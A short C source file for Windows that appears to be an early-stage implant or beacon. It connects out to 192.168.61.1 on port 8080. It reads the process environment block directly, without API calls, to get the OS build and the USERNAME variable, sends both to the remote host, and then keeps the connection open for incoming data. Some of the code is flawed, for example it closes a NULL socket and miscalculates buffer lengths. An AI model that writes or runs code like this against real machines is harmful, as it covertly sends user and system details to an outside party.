#include <winsock2.h>
#include <windows.h>

CRITICAL_SECTION olock;
volatile int totclnt = 0;
wchar_t user[20];
DWORD usrlen = 20;
volatile BOOL urdy = FALSE;
volatile int glbuld = 0;

DWORD WINAPI crthrd2222(LPVOID lParam) {
	
	SOCKET thrd2 = (SOCKET)lParam;
	
	unsigned char* pb = (unsigned char*)__readgsqword(0x60);
	USHORT buldnum = *(USHORT*)(pb + 0x120);
	
	int iwin11 = 0;
	
	if(buldnum >= 22000) {
		iwin11 = 1;
	} else {
		iwin11 = 0;
	}
	
	EnterCriticalSection(&olock);
	glbuld = buldnum;
	LeaveCriticalSection(&olock);
	
	unsigned char* unm = *(unsigned char**)(pb + 0x20);
	wchar_t* bpm = *(wchar_t**)(unm + 0x80);
	
	wchar_t* cn = bpm;
	
	while(*cn != L'\0') {
		
		if (cn[0] == L'U' && cn[1] == L'S' && cn[2] == L'E' &&
            cn[3] == L'R' && cn[4] == L'N' && cn[5] == L'A' &&
            cn[6] == L'M' && cn[7] == L'E' && cn[8] == L'=') {
            
            wchar_t* rawUsername = cn + 9;

            EnterCriticalSection(&olock);
            int i = 0;
            while (rawUsername[i] != L'\0' && i < 18) {
                user[i] = rawUsername[i]; 
                i++;
            }
            user[i] = L'\n'; 
			i++;
			user[i] = L'\0';
            LeaveCriticalSection(&olock);
            break; 
        }

        while (*cn != L'\0') {
            cn++;
        }
        cn++; 
    }
	Sleep(100);
	
	EnterCriticalSection(&olock);
	urdy = TRUE;
	LeaveCriticalSection(&olock);
	
	closesocket(thrd2);
	ExitThread(0);

}

DWORD WINAPI crthrd(LPVOID lParam) {
	
	SOCKET thrd = (SOCKET)lParam;
	wchar_t buffer[100];
	char response[] = "Message recvd\n";
	
	
	while(1) {
		
		if(urdy) {
			DWORD bytsnd = usrlen * sizeof(wchar_t);
			send(thrd,(char*)user,bytsnd,0);
			urdy = FALSE;
		}
		
		int crntbuld = 0;
		Sleep(100);
		
	EnterCriticalSection(&olock);
	crntbuld = glbuld;
	LeaveCriticalSection(&olock);
	
	if(crntbuld >= 22000) {
		send(thrd,"Windows 11\n",sizeof("Windows 11\n") - 1,0);
	    }    else if(crntbuld >= 1 && crntbuld < 22000) {
			send(thrd,"Windows 10\n",sizeof("Windows 10\n") - 1,0);
		} else {
			send(thrd,"Unknown\n",sizeof("Unknown\n") - 1,0);
		}
		
		send(thrd,response,sizeof(response) - 1,0);
		
		Sleep(100);
		
	EnterCriticalSection(&olock);
	totclnt++;
	LeaveCriticalSection(&olock);
	
	int revc = recv(thrd,(char*)buffer,100 - 1 * sizeof(wchar_t),0);
	
	if(revc > 0) {
		buffer[revc / sizeof(wchar_t)] = L'\0';
		
	} else {
		break;
	}
	Sleep(300);
	}
	
	
	closesocket(thrd);
	ExitThread(0);
	
}

__attribute__((force_align_arg_pointer))
void entry(void) {
WSADATA ws;

WSAStartup(MAKEWORD(2,2),&ws);

InitializeCriticalSection(&olock);

SOCKET man = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

struct sockaddr_in srv = {0};

srv.sin_family = AF_INET;
srv.sin_port = htons(8080);
srv.sin_addr.s_addr = inet_addr("192.168.61.1");
int ho = connect(man,(const struct sockaddr*)&srv,sizeof(srv));
if(ho == SOCKET_ERROR) {
	MessageBoxW(NULL,L"fail connection",L"OK",MB_OK);
	closesocket(man);
	DeleteCriticalSection(&olock);
	WSACleanup();
	ExitProcess(1);
}

HANDLE h1thrd = CreateThread(NULL,0,crthrd2222,NULL,0,NULL);
if(!h1thrd) {
	MessageBoxW(NULL,L"error thread",L"OK",MB_OK);
	WSACleanup();
	ExitProcess(1);
} 

WaitForSingleObject(h1thrd,INFINITE);

HANDLE hthrd = CreateThread(NULL,0,crthrd,(LPVOID)man,0,NULL);
if(!hthrd) {
	MessageBoxW(NULL,L"error thread",L"OK",MB_OK);
	closesocket(man);
	DeleteCriticalSection(&olock);
	WSACleanup();
	ExitProcess(1);
} 

WaitForSingleObject(hthrd,INFINITE);

CloseHandle(h1thrd);
CloseHandle(hthrd);
DeleteCriticalSection(&olock);
WSACleanup();
ExitProcess(0);
}